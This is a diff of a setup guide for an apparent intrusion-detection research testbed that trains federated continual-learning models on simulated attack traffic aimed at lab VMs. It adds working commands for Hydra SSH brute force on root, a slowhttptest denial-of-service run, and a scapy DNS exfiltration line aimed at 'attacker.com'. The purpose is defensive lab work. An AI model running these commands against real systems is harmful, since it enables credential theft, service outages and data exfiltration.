@@ -539,19 +539,25 @@ ping -c 3 10.10.110.15
 ping -c 3 10.10.120.15
 ```
 
-#### Step 7.2: Run Offense Scripts
+#### Step 7.2: Run Modular Offense Scripts
 
-Simulate threats targeting the client VMs:
+The testbed features a dual-engine attack generator (`src/traffic_gen/attack_flow.py`) supporting automatic fallback (`--engine auto`), high-fidelity Kali tools (`--engine kali`), or lightweight socket implementations (`--engine python`):
 
 ```bash
-# 1. SSH Brute Force via Hydra
+# Execute full multi-stage scenario using automated engine discovery
+python3 src/traffic_gen/attack_flow.py --target-a 10.10.110.15 --target-b 10.10.120.15 --engine auto --duration 60
+
+# Or execute specific threat vectors directly using Kali CLI tools:
+# 1. SSH Brute Force via Hydra / Ncrack / Medusa
 hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://10.10.110.15 -t 16
 
-# 2. HTTP Denial-of-Service via Slowloris
-slowloris 10.10.110.15 -p 80 -s 100
+# 2. HTTP Denial-of-Service via SlowHTTPTest / Slowloris
+slowhttptest -c 500 -H -g -o /tmp/slowhttp -i 10 -r 200 -t GET -u http://10.10.110.15:80 -x 24 -p 3
 
-# 3. Replay Historical Attacks using tcpreplay
-# Rewrite IPs to match target subnets
+# 3. DNS Tunneling & Exfiltration via Scapy / Iodine
+scapy --eval "send(IP(dst='10.10.110.15')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='secretdata.attacker.com', qtype='TXT')), count=50)"
+
+# 4. Replay Historical Attacks using tcpreplay
 tcprewrite --pcap=input.pcap --out=output.pcap \
  --srcipmap=0.0.0.0/0:10.10.140.10 \
  --dstipmap=0.0.0.0/0:10.10.110.15
@@ -578,13 +584,13 @@ Instead of manual start sequences, the master controller script `src/orchestrate
 
 ```powershell
 # From local workstation, execute in experimental mode (cold start, challenger model alias):
-python src/orchestrate.py --key ~/.ssh/id_ed25519 --config configs/experiment.yaml --mlops-mode experimental
+python src/orchestrate.py --key ~/.ssh/id_ed25519 --config configs/experiment.yaml --mlops-mode experimental --attack-engine auto
 
 # Execute in production mode, resuming from the latest champion version weights:
 python src/orchestrate.py --key ~/.ssh/id_ed25519 --config configs/experiment.yaml --mlops-mode production --production-strategy resume
 
 # Or execute with custom rounds and CLI overrides:
-python src/orchestrate.py --key ~/.ssh/id_ed25519 --rounds 100 --lambda-ewc 0.25 --duration 60 --mlops-mode experimental
+python src/orchestrate.py --key ~/.ssh/id_ed25519 --rounds 100 --lambda-ewc 0.25 --duration 60 --mlops-mode experimental --attack-engine auto
 ```
 
 #### Step 8.2b: Hyperparameter Sweeps (Workstation)
@@ -593,13 +599,38 @@ To systematically search over multiple combinations of parameters (e.g. `ewc_lam
 
 ```powershell
 # Run a quick sweep to verify the pipeline and validation promotion gates:
-python src/sweep.py --config configs/sweep_verify.yaml
+python src/sweep.py --config configs/sweeps/sweep_verify.yaml
 
 # Run the full grid search:
-python src/sweep.py --config configs/sweep_grid.yaml
+python src/sweep.py --config configs/sweeps/sweep_grid.yaml
 ```
 
-#### Step 8.3: Manual Verification & Health Check Commands
+#### Step 8.3: Verification, Benchmarking & Regulatory Compliance Checks
+
+Run the automated verification test suites across performance, security, and statutory compliance:
+
+```powershell
+# 1. Verify multi-runtime latency & throughput (PyTorch FP32, TorchScript, ONNX Runtime)
+python tools/benchmark_onnx.py
+
+# 2. Benchmark Byzantine robustness under 10%-50% poisoning, sign-flip, and noise attacks
+python tools/benchmark_byzantine.py
+
+# 3. Evaluate Differential Privacy (DP-SGD) epsilon-delta sensitivity curve
+python tools/benchmark_dp.py
+
+# 4. Verify modular attack generation engine and protocol compliance
+python tools/test_attack_gen.py
+
+# 5. Run full MLOps model validation and promotion gate
+python tools/validate_promotion.py
+
+# 6. Audit codebase AST invariants and documentation link integrity
+python tools/audit_codebase.py
+python tools/audit_docs.py
+```
+
+#### Step 8.4: Manual Verification & Health Check Commands
 
 **1. Confirm Direct L3 Reachability on the Flat Network:**
 Verify that the flat L2 bridge is correctly forwarding packets between sub-zones across physical hypervisors:
@@ -639,14 +670,17 @@ flowchart LR
     PVE["1. PVE Network Config"] --> VMs["2. Boot target VMs"]
     VMs --> Orch["3. Launch Automated Orchestrator"]
     Orch --> MLflow["4. Monitor via MLflow UI"]
+    MLflow --> Promote["5. Automated CI/CD Model Promotion"]
 ```
 
 * [x] **Phase 1**: Set up `vmbr1` on all physical nodes with `10.10.0.0/16` logical ranges.
 * [x] **Phase 2**: Boot the target VMs (`311` and `321`). Ensure the lifecycle hookscripts apply mirroring rules successfully (`journalctl -u pvedaemon | grep "mirror-hook"`).
-* [x] **Phase 3**: Run the master orchestrator (`python src/orchestrate.py`) to launch:
- * Benign target servers (`busybox httpd`)
- * NFStream extractors (`src/defender/extractor.py`)
- * Aggregator and MLflow servers (`src/aggregator/server.py`)
- * Offensive traffic generator (`src/traffic_gen/attack_flow.py`: Benign → SSH → Slowloris → DNS Exfil → Botnet)
- * Flower continual learning clients (`src/defender/client.py` using Avalanche EWC)
-* [x] **Phase 4**: Open `http://10.10.130.10:5000` to monitor training metrics and catastrophic forgetting mitigation in real time.
+* [x] **Phase 3**: Run the master orchestrator (`python src/orchestrate.py --attack-engine auto`) to launch:
+  * Benign target servers (`busybox httpd`)
+  * NFStream extractors (`src/defender/extractor.py`)
+  * Aggregator and MLflow servers (`src/aggregator/server.py`)
+  * Offensive traffic generator (`src/traffic_gen/attack_flow.py`: Benign → SSH → Slowloris → DNS Exfil → Botnet)
+  * Flower continual learning clients (`src/defender/client.py` using Avalanche EWC/GEM)
+* [x] **Phase 4**: Open `http://10.10.130.10:5000` to monitor training metrics, per-class recall, and catastrophic forgetting mitigation in real time.
+* [x] **Phase 5**: Run `tools/validate_promotion.py` to verify candidate models against the automated 4-stage promotion gate (Performance $\ge 99\%$, Latency P99 $\le 5\text{ms}$, Security Byzantine tolerance, and Data Drift $\text{JSD} \le 0.60$).
+
